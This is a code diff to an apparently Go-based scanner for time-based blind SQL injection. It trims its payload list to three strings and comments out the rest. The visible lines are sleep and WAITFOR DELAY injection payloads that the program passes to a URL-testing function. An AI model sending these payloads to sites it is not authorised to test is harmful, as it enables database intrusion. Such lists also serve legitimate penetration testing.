@@ -109,8 +109,10 @@ func main() {
 	payloads := []string{
 		"if(now()=sysdate()%2Csleep(tempoSQLi)%2C0)",	
 		"1'XOR(if(now()=sysdate()%2Csleep(tempoSQLi)%2C0))XOR'Z",		
-		"1'XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR'Z",
-		"1\\\"XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR\\\"Z",
+		"1'XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR'Z"
+	}
+
+	/*	"1\\\"XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR\\\"Z",
 		"1'or'SLEEP(tempoSQLi)",		
 		"%20or%20sleep(tempoSQLi)#",
 		"1)%20or%20sleep(tempoSQLi)#",
@@ -153,7 +155,7 @@ func main() {
 		"%20or%20SLEEP(tempoSQLi)='",
 		"%20or%20WAITFOR%20DELAY%20'tempoSQLi'",
 		"%20or%20WAITFOR%20DELAY%20'tempoSQLi'--",
-	}
+  */
 
 	testarURLs(tempoSQLi, payloads)
 }
